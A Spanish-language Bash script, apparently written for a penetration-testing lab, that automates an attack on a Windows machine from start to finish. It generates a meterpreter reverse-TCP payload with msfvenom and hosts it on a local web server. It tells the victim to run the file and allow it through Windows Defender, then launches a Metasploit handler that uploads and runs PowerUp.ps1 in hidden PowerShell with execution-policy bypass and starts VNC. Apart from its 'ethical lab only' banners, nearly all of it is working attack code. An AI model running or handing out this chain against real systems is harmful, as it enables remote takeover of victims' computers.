#!/bin/bash

# Script para automatizar el Lab 1.4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
# Versi√≥n Final - Funcional y Bonita
# Flujo: msfvenom payload -> servidor web -> meterpreter -> escalaci√≥n -> VNC session

# Colores para una salida bonita
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No hay color
CHECKMARK="‚úÖ"
ERROR="‚ùå"
INFO="‚ÑπÔ∏è"
ROCKET="üöÄ"
COMPUTER="üíª"
SHIELD="üõ°Ô∏è"

# Variables de configuraci√≥n (detectadas autom√°ticamente)
INTERFACE=""                                       # Se detectar√° autom√°ticamente
LHOST=""                                          # Se detectar√° autom√°ticamente
LPORT="4444"                                      # Puerto para meterpreter
HTTP_PORT="8000"                                  # Puerto para servidor web
PAYLOAD_NAME="Prueba.exe"                         # Nombre del payload
DESKTOP_PATH=""                                   # Se detectar√° autom√°ticamente
PAYLOAD_PATH=""                                   # Se configurar√° autom√°ticamente
POWERSPLOIT_PATH=""                               # Se configurar√° autom√°ticamente
MSF_RC_FILE="/tmp/lab14_handler.rc"               # Archivo de resource para Metasploit
COMMANDS_RC="/tmp/lab14_commands.rc"              # Archivo de comandos para automatizaci√≥n

# Funci√≥n para mostrar el banner
print_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
        ‚ïë                                                    ‚ïë
        ‚ïë   üéØ Lab 1.4: Client-Side Exploit to VNC Session  ‚ïë
        ‚ïë   üíÄ Desarrollado por The-White-Hat üé©            ‚ïë
        ‚ïë   üöÄ ¬°Suerte en tu aventura de hacking √©tico!     ‚ïë
        ‚ïë                                                    ‚ïë
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}¬°Pana, bienvenido al script para el Lab 1.4: Client-Side Attack!${NC}"
    echo -e "${RED}‚ö†Ô∏è Ojo: Esto es solo para laboratorios con permiso. ¬°S√© √©tico, pana!${NC}"
    echo -e "${CYAN}Flujo: Payload ‚Üí Servidor Web ‚Üí Meterpreter ‚Üí Privesc ‚Üí VNC${NC}"
    echo -e "${BLUE}========================================${NC}"
}

# Funci√≥n para mostrar un separador
print_separator() {
    echo -e "${BLUE}========================================${NC}"
}

# Funci√≥n para detectar configuraci√≥n del usuario
detect_user_config() {
    print_separator
    echo -e "${YELLOW}${INFO} Detectando configuraci√≥n de tu sistema...${NC}"
    
    # Detectar usuario actual y configurar rutas
    CURRENT_USER=$(whoami)
    echo -e "${BLUE}Usuario detectado: $CURRENT_USER${NC}"
    
    if [ "$CURRENT_USER" = "kali" ]; then
        DESKTOP_PATH="/home/kali/Desktop"
    elif [ "$CURRENT_USER" = "root" ]; then
        DESKTOP_PATH="/root/Desktop"
    else
        DESKTOP_PATH="/home/$CURRENT_USER/Desktop"
    fi
    
    echo -e "${BLUE}Directorio Desktop: $DESKTOP_PATH${NC}"
    
    # Configurar rutas dependientes
    PAYLOAD_PATH="$DESKTOP_PATH/$PAYLOAD_NAME"
    POWERSPLOIT_PATH="$DESKTOP_PATH/PowerSploit"
    
    # Crear directorio Desktop si no existe
    if [ ! -d "$DESKTOP_PATH" ]; then
        echo -e "${YELLOW}${INFO} Creando directorio Desktop: $DESKTOP_PATH${NC}"
        mkdir -p "$DESKTOP_PATH"
        if [ $? -ne 0 ]; then
            echo -e "${RED}${ERROR} ¬°√âpale! No se pudo crear el directorio $DESKTOP_PATH${NC}"
            exit 1
        fi
    fi
    
    # Detectar interfaz de red principal (que tenga IP y no sea loopback)
    echo -e "${BLUE}Detectando interfaz de red principal...${NC}"
    
    # M√©todo 1: Buscar interfaz con ruta por defecto
    INTERFACE=$(ip route show default | awk '/default/ { print $5 }' | head -n1)
    
    if [ -z "$INTERFACE" ]; then
        # M√©todo 2: Buscar interfaz activa que no sea loopback
        INTERFACE=$(ip addr show | grep -E "state UP" | grep -v "lo:" | head -n1 | cut -d: -f2 | tr -d ' ')
    fi
    
    if [ -z "$INTERFACE" ]; then
        # M√©todo 3: Buscar cualquier interfaz que no sea lo
        INTERFACE=$(ip link show | grep -E "^[0-9]+:" | grep -v "lo:" | head -n1 | cut -d: -f2 | tr -d ' ')
    fi
    
    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}${ERROR} ¬°√âpale! No se pudo detectar una interfaz de red.${NC}"
        echo -e "${YELLOW}${INFO} Interfaces disponibles:${NC}"
        ip link show | grep -E "^[0-9]+:" | cut -d: -f2 | tr -d ' '
        echo -e "${YELLOW}${INFO} Configura manualmente tu interfaz de red.${NC}"
        exit 1
    fi
    
    echo -e "${BLUE}Interfaz detectada: $INTERFACE${NC}"
    
    # Obtener IP de la interfaz detectada
    LHOST=$(ip addr show "$INTERFACE" | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
    
    if [ -z "$LHOST" ]; then
        echo -e "${RED}${ERROR} ¬°√âpale! La interfaz $INTERFACE no tiene IP asignada.${NC}"
        echo -e "${YELLOW}${INFO} Verifica tu configuraci√≥n de red:${NC}"
        echo -e "${CYAN}‚Ä¢ sudo dhclient $INTERFACE${NC}"
        echo -e "${CYAN}‚Ä¢ sudo ip addr add IP/24 dev $INTERFACE${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}${CHECKMARK} Configuraci√≥n detectada exitosamente:${NC}"
    echo -e "${CYAN}‚Ä¢ Usuario: $CURRENT_USER${NC}"
    echo -e "${CYAN}‚Ä¢ Interfaz: $INTERFACE${NC}"
    echo -e "${CYAN}‚Ä¢ IP: $LHOST${NC}"
    echo -e "${CYAN}‚Ä¢ Desktop: $DESKTOP_PATH${NC}"
    echo -e "${CYAN}‚Ä¢ Payload: $PAYLOAD_PATH${NC}"
}

# Funci√≥n para verificar dependencias
check_dependencies() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 1: Verificando dependencias necesarias...${NC}"
    
    # Verificar que las variables est√©n configuradas
    if [ -z "$DESKTOP_PATH" ] || [ -z "$LHOST" ] || [ -z "$INTERFACE" ]; then
        echo -e "${RED}${ERROR} ¬°√âpale! Error en la configuraci√≥n del sistema. Variables vac√≠as.${NC}"
        echo -e "${YELLOW}${INFO} DESKTOP_PATH: '$DESKTOP_PATH'${NC}"
        echo -e "${YELLOW}${INFO} LHOST: '$LHOST'${NC}"
        echo -e "${YELLOW}${INFO} INTERFACE: '$INTERFACE'${NC}"
        exit 1
    fi
    
    # Lista de dependencias cr√≠ticas
    local missing_deps=()
    
    # Verificar msfvenom y msfconsole (Metasploit)
    if ! command -v msfvenom &> /dev/null; then
        missing_deps+=("metasploit-framework")
    fi
    
    if ! command -v msfconsole &> /dev/null; then
        missing_deps+=("metasploit-framework")
    fi
    
    # Verificar python3
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    # Verificar git
    if ! command -v git &> /dev/null; then
        missing_deps+=("git")
    fi
    
    # Verificar TightVNC viewer
    if ! command -v xtightvncviewer &> /dev/null && ! command -v vncviewer &> /dev/null; then
        missing_deps+=("xtightvncviewer")
    fi
    
    # Si hay dependencias faltantes, mostrarlas e instalar
    if [ ${#missing_deps[@]} -gt 0 ]; then
        echo -e "${YELLOW}${INFO} Faltan algunas dependencias. Instalando autom√°ticamente...${NC}"
        
        # Actualizar repos
        sudo apt update
        
        # Instalar dependencias faltantes
        for dep in "${missing_deps[@]}"; do
            echo -e "${YELLOW}${INFO} Instalando $dep...${NC}"
            sudo apt install -y "$dep"
            
            if [ $? -ne 0 ]; then
                echo -e "${RED}${ERROR} ¬°√âpale! No se pudo instalar $dep autom√°ticamente.${NC}"
                echo -e "${YELLOW}${INFO} Inst√°lalo manualmente con: sudo apt install $dep${NC}"
                exit 1
            fi
        done
    fi
    
    # Verificar que todo est√© instalado correctamente
    for cmd in msfvenom msfconsole python3 git; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}${ERROR} ¬°√âpale! $cmd sigue sin estar disponible despu√©s de la instalaci√≥n.${NC}"
            exit 1
        fi
    done
    
    echo -e "${GREEN}${CHECKMARK} ¬°Todas las dependencias est√°n listas!${NC}"
    echo -e "${CYAN}‚Ä¢ msfvenom: $(which msfvenom)${NC}"
    echo -e "${CYAN}‚Ä¢ msfconsole: $(which msfconsole)${NC}"
    echo -e "${CYAN}‚Ä¢ python3: $(which python3)${NC}"
    echo -e "${CYAN}‚Ä¢ git: $(which git)${NC}"
    
    # Verificar TightVNC
    if command -v xtightvncviewer &> /dev/null; then
        echo -e "${CYAN}‚Ä¢ VNC Viewer: $(which xtightvncviewer)${NC}"
    elif command -v vncviewer &> /dev/null; then
        echo -e "${CYAN}‚Ä¢ VNC Viewer: $(which vncviewer)${NC}"
    else
        echo -e "${YELLOW}${INFO} TightVNC no est√° instalado, pero se puede instalar luego.${NC}"
    fi
}

# Funci√≥n para generar el payload malicioso
generate_payload() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 2: Generando payload malicioso con msfvenom...${NC}"
    echo -e "${BLUE}Comando: msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=$LHOST LPORT=$LPORT -o $PAYLOAD_PATH${NC}"
    
    msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST="$LHOST" LPORT="$LPORT" -o "$PAYLOAD_PATH"
    
    if [ $? -eq 0 ] && [ -f "$PAYLOAD_PATH" ]; then
        echo -e "${GREEN}${CHECKMARK} ¬°Payload generado exitosamente!${NC}"
        echo -e "${CYAN}${COMPUTER} Archivo: $PAYLOAD_PATH${NC}"
        echo -e "${CYAN}${COMPUTER} Tama√±o: $(du -h "$PAYLOAD_PATH" | cut -f1)${NC}"
    else
        echo -e "${RED}${ERROR} ¬°√âpale! No se pudo generar el payload.${NC}"
        exit 1
    fi
}

# Funci√≥n para iniciar el servidor web
start_web_server() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 3: Iniciando servidor web HTTP en puerto $HTTP_PORT...${NC}"
    
    # Cambiar al directorio Desktop para servir archivos
    cd "$DESKTOP_PATH" || exit 1
    
    # Verificar si el puerto est√° disponible
    if netstat -tlnp 2>/dev/null | grep -q ":$HTTP_PORT "; then
        echo -e "${YELLOW}${INFO} Puerto $HTTP_PORT ya est√° en uso. Matando proceso...${NC}"
        sudo pkill -f "python3 -m http.server $HTTP_PORT"
        sleep 2
    fi
    
    # Iniciar servidor web en segundo plano
    python3 -m http.server $HTTP_PORT &
    WEB_SERVER_PID=$!
    
    # Esperar un momento para que inicie
    sleep 3
    
    if ps -p $WEB_SERVER_PID > /dev/null 2>&1; then
        echo -e "${GREEN}${CHECKMARK} ¬°Servidor web iniciado exitosamente! (PID: $WEB_SERVER_PID)${NC}"
        echo -e "${CYAN}${ROCKET} URL del payload: http://$LHOST:$HTTP_PORT/$PAYLOAD_NAME${NC}"
    else
        echo -e "${RED}${ERROR} ¬°√âpale! No se pudo iniciar el servidor web.${NC}"
        exit 1
    fi
}

# Funci√≥n para crear los archivos de automatizaci√≥n
create_automation_files() {
    echo -e "${YELLOW}${INFO} Creando archivos de automatizaci√≥n...${NC}"
    
    # Crear archivo de comandos meterpreter
    cat > "$COMMANDS_RC" << EOF
# Esperar que se estabilice la sesi√≥n
sleep 5

# Subir PowerUp
upload $POWERSPLOIT_PATH/Privesc/PowerUp.ps1 C:\\\\Windows\\\\Temp\\\\PowerUp.ps1

# Ejecutar PowerShell directamente sin shell
execute -f powershell.exe -i -H -a "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"& {cd C:\\\\Windows\\\\Temp; . .\\\\PowerUp.ps1; Invoke-AllChecks | Out-File -FilePath C:\\\\Windows\\\\Temp\\\\results.txt}\\""

# Esperar que termine
sleep 10

# Mostrar resultados
cat C:\\\\Windows\\\\Temp\\\\results.txt

# Iniciar VNC
run vnc
EOF
    
    # Crear handler con automatizaci√≥n Ruby
    cat > "$MSF_RC_FILE" << EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $LHOST
set lport $LPORT
exploit -j

# Script Ruby para automatizar cuando llegue la sesi√≥n
<ruby>
print_status("Esperando sesi√≥n...")
while framework.sessions.length == 0
  sleep 1
end

sleep 3
session = framework.sessions.first[1]
print_good("Sesi√≥n recibida! Ejecutando comandos autom√°ticos...")

# Ejecutar cada comando del archivo
File.readlines('$COMMANDS_RC').each do |line|
  next if line.strip.empty? || line.start_with?('#')
  if line.start_with?('sleep')
    sleep_time = line.split[1].to_i
    print_status("Esperando #{sleep_time} segundos...")
    sleep(sleep_time)
  else
    print_status("Ejecutando: #{line.strip}")
    session.console.run_single(line.strip)
    sleep(1)
  end
end

print_good("¬°Automatizaci√≥n completada! VNC deber√≠a estar inici√°ndose...")
</ruby>
EOF
    
    echo -e "${GREEN}${CHECKMARK} Archivos de automatizaci√≥n creados:${NC}"
    echo -e "${CYAN}‚Ä¢ Handler: $MSF_RC_FILE${NC}"
    echo -e "${CYAN}‚Ä¢ Comandos: $COMMANDS_RC${NC}"
    echo ""
    echo -e "${YELLOW}Flujo autom√°tico configurado:${NC}"
    echo -e "${BLUE}1. Handler esperar√° la conexi√≥n${NC}"
    echo -e "${BLUE}2. Cuando llegue la sesi√≥n, ejecutar√° autom√°ticamente:${NC}"
    echo -e "${CYAN}   - Subir PowerUp.ps1${NC}"
    echo -e "${CYAN}   - Ejecutar PowerShell con bypass${NC}"
    echo -e "${CYAN}   - Ejecutar Invoke-AllChecks${NC}"
    echo -e "${CYAN}   - Mostrar resultados${NC}"
    echo -e "${CYAN}   - Iniciar VNC${NC}"
    echo -e "${GREEN}¬°Todo automatizado!${NC}"
}

# Funci√≥n para mostrar instrucciones para la v√≠ctima
show_victim_instructions() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 4: Instrucciones para la m√°quina v√≠ctima (Windows)${NC}"
    echo -e "${BLUE}${COMPUTER} El servidor web y Metasploit est√°n listos.${NC}"
    echo ""
    echo -e "${CYAN}üìã DALE ESTAS INSTRUCCIONES A LA V√çCTIMA (o hazlo t√∫ en la m√°quina Windows):${NC}"
    echo ""
    echo -e "${YELLOW}‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê${NC}"
    echo -e "${YELLOW}‚îÇ                PASOS EN WINDOWS:                        ‚îÇ${NC}"
    echo -e "${YELLOW}‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§${NC}"
    echo -e "${CYAN}‚îÇ 1. Abrir un navegador web (Chrome, Firefox, Edge)     ‚îÇ${NC}"
    echo -e "${CYAN}‚îÇ 2. Ir a: ${YELLOW}http://$LHOST:$HTTP_PORT/${NC}                     ${CYAN}‚îÇ${NC}"
    echo -e "${CYAN}‚îÇ 3. Descargar el archivo: ${YELLOW}$PAYLOAD_NAME${NC}               ${CYAN}‚îÇ${NC}"
    echo -e "${CYAN}‚îÇ 4. Ejecutar el archivo descargado                      ‚îÇ${NC}"
    echo -e "${CYAN}‚îÇ 5. Si aparece Windows Defender: 'Permitir'             ‚îÇ${NC}"
    echo -e "${YELLOW}‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò${NC}"
    echo ""
    echo -e "${RED}${SHIELD} IMPORTANTE PARA EL ATACANTE:${NC}"
    echo -e "${RED}‚Ä¢ Esto es SOLO para laboratorios √©ticos con permiso${NC}"
    echo -e "${RED}‚Ä¢ La v√≠ctima debe desactivar Windows Defender temporalmente${NC}"
    echo -e "${RED}‚Ä¢ Aseg√∫rate de estar en la misma red que la v√≠ctima${NC}"
    echo ""
    echo -e "${BLUE}Cuando la v√≠ctima ejecute el payload, todo se ejecutar√° autom√°ticamente.${NC}"
    echo -e "${BLUE}Presiona Enter para continuar con Metasploit...${NC}"
    read -r
}

# Funci√≥n para iniciar Metasploit con handler
start_metasploit_handler() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 5: Preparando Metasploit handler autom√°tico...${NC}"
    
    # Crear los archivos de automatizaci√≥n
    create_automation_files
    
    echo -e "${BLUE}${COMPUTER} El handler est√° configurado para recibir conexiones en $LHOST:$LPORT${NC}"
    echo ""
    echo -e "${CYAN}üìã QUE HAR√Å METASPLOIT AUTOM√ÅTICAMENTE:${NC}"
    echo -e "${CYAN}‚Ä¢ Se configurar√° el handler${NC}"
    echo -e "${CYAN}‚Ä¢ Esperar√° la conexi√≥n de la v√≠ctima${NC}"
    echo -e "${CYAN}‚Ä¢ Al recibir sesi√≥n ejecutar√° TODO autom√°ticamente${NC}"
    echo ""
    echo -e "${RED}${SHIELD} RECUERDA: La v√≠ctima debe ejecutar el payload primero${NC}"
    echo -e "${BLUE}Presiona Enter para abrir msfconsole...${NC}"
    read -r
    
    echo -e "${GREEN}${CHECKMARK} Iniciando msfconsole con automatizaci√≥n completa...${NC}"
    echo -e "${YELLOW}${INFO} Ver√°s todo el proceso autom√°tico cuando llegue la sesi√≥n${NC}"
    echo ""
    
    # Ejecutar msfconsole con el resource file
    sudo msfconsole -q -r "$MSF_RC_FILE"
}

# Funci√≥n para descargar PowerSploit si no existe
download_powersploit() {
    print_separator
    echo -e "${YELLOW}${INFO} Descargando PowerSploit en la m√°quina atacante...${NC}"
    
    if [ ! -d "$POWERSPLOIT_PATH" ]; then
        echo -e "${YELLOW}${INFO} PowerSploit no encontrado. Descargando desde GitHub...${NC}"
        cd "$DESKTOP_PATH" || exit 1
        
        echo -e "${BLUE}Ejecutando: git clone https://github.com/PowerShellMafia/PowerSploit.git${NC}"
        git clone https://github.com/PowerShellMafia/PowerSploit.git
        
        if [ $? -eq 0 ] && [ -d "$POWERSPLOIT_PATH" ]; then
            echo -e "${GREEN}${CHECKMARK} PowerSploit descargado exitosamente en $POWERSPLOIT_PATH${NC}"
        else
            echo -e "${RED}${ERROR} ¬°√âpale! No se pudo descargar PowerSploit.${NC}"
            echo -e "${YELLOW}${INFO} Intenta descargarlo manualmente con:${NC}"
            echo -e "${CYAN}cd $DESKTOP_PATH && git clone https://github.com/PowerShellMafia/PowerSploit.git${NC}"
            exit 1
        fi
    else
        echo -e "${GREEN}${CHECKMARK} PowerSploit ya est√° disponible en $POWERSPLOIT_PATH${NC}"
    fi
    
    # Verificar que PowerUp.ps1 existe
    if [ ! -f "$POWERSPLOIT_PATH/Privesc/PowerUp.ps1" ]; then
        echo -e "${RED}${ERROR} ¬°√âpale! No se encuentra PowerUp.ps1 en $POWERSPLOIT_PATH/Privesc/${NC}"
        exit 1
    else
        echo -e "${GREEN}${CHECKMARK} PowerUp.ps1 encontrado en $POWERSPLOIT_PATH/Privesc/PowerUp.ps1${NC}"
    fi
}

# Funci√≥n para mostrar resumen final
show_summary() {
    print_separator
    echo -e "${GREEN}${CHECKMARK} ¬°Lab 1.4 configurado exitosamente!${NC}"
    echo ""
    echo -e "${CYAN}üìã RESUMEN DE CONFIGURACI√ìN:${NC}"
    echo -e "${BLUE}‚Ä¢ Payload generado: $PAYLOAD_PATH${NC}"
    echo -e "${BLUE}‚Ä¢ Servidor web: http://$LHOST:$HTTP_PORT/${NC}"
    echo -e "${BLUE}‚Ä¢ Handler configurado para: $LHOST:$LPORT${NC}"
    echo -e "${BLUE}‚Ä¢ PowerSploit disponible en: $POWERSPLOIT_PATH${NC}"
    echo -e "${BLUE}‚Ä¢ Automatizaci√≥n: COMPLETAMENTE ACTIVADA${NC}"
    echo ""
    echo -e "${YELLOW}${ROCKET} PR√ìXIMOS PASOS:${NC}"
    echo -e "${CYAN}1. La v√≠ctima ejecut√≥ el payload${NC}"
    echo -e "${CYAN}2. Recibiste la sesi√≥n meterpreter${NC}"
    echo -e "${CYAN}3. Los comandos se ejecutaron autom√°ticamente${NC}"
    echo -e "${CYAN}4. ¬°VNC est√° listo para usar!${NC}"
    echo ""
    echo -e "${PURPLE}Desarrollado por The-White-Hat üé© - ¬°S√≠guete hackeando √©ticamente!${NC}"
}

# Funci√≥n para limpiar procesos al salir
cleanup() {
    echo -e "\n${YELLOW}${INFO} Limpiando procesos...${NC}"
    
    # Matar servidor web si est√° corriendo
    if [ ! -z "$WEB_SERVER_PID" ] && ps -p $WEB_SERVER_PID > /dev/null 2>&1; then
        echo -e "${YELLOW}${INFO} Deteniendo servidor web...${NC}"
        kill $WEB_SERVER_PID 2>/dev/null
    fi
    
    # Limpiar archivos temporales
    if [ -f "$MSF_RC_FILE" ]; then
        rm -f "$MSF_RC_FILE"
    fi
    
    if [ -f "$COMMANDS_RC" ]; then
        rm -f "$COMMANDS_RC"
    fi
    
    echo -e "${GREEN}${CHECKMARK} ¬°Limpieza completada!${NC}"
}

# Configurar trap para limpiar al salir
trap cleanup EXIT

# Funci√≥n para mostrar ayuda
show_help() {
    print_separator
    echo -e "${YELLOW}${INFO} AYUDA - Soluci√≥n a problemas comunes:${NC}"
    echo ""
    echo -e "${BLUE}‚ùì No se genera la sesi√≥n meterpreter:${NC}"
    echo -e "${CYAN}‚Ä¢ Verifica que Windows Defender est√© desactivado${NC}"
    echo -e "${CYAN}‚Ä¢ Aseg√∫rate de que la v√≠ctima y atacante est√©n en la misma red${NC}"
    echo -e "${CYAN}‚Ä¢ Prueba el payload con: netstat -an | grep $LPORT${NC}"
    echo ""
    echo -e "${BLUE}‚ùì PowerSploit no funciona:${NC}"
    echo -e "${CYAN}‚Ä¢ El script ya maneja la ejecuci√≥n autom√°ticamente${NC}"
    echo -e "${CYAN}‚Ä¢ Los resultados se guardan en C:\\Windows\\Temp\\results.txt${NC}"
    echo ""
    echo -e "${BLUE}‚ùì VNC no se conecta:${NC}"
    echo -e "${CYAN}‚Ä¢ El script ejecuta 'run vnc' autom√°ticamente${NC}"
    echo -e "${CYAN}‚Ä¢ Verifica que TightVNC est√© instalado en Kali${NC}"
    echo ""
    echo -e "${BLUE}‚ùì Instalar TightVNC en Kali:${NC}"
    echo -e "${CYAN}‚Ä¢ sudo apt update && sudo apt install xtightvncviewer${NC}"
    echo ""
    echo -e "${GREEN}${CHECKMARK} ¬°Este script automatiza TODO el proceso!${NC}"
}

# Funci√≥n principal
main() {
    # Verificar permisos b√°sicos
    if [ "$EUID" -eq 0 ]; then
        echo -e "${YELLOW}${INFO} Detectado que corres como root. El script funcionar√° correctamente.${NC}"
    fi
    
    print_banner
    detect_user_config      # Detectar configuraci√≥n
    check_dependencies      # Verificar dependencias
    generate_payload        # Generar payload malicioso
    download_powersploit    # Descargar PowerSploit
    start_web_server        # Iniciar servidor web
    show_victim_instructions # Mostrar instrucciones para la v√≠ctima
    start_metasploit_handler # Iniciar msfconsole con automatizaci√≥n
    show_summary            # Resumen final
    show_help               # Ayuda
}

# Ejecutar el script
main "$@"
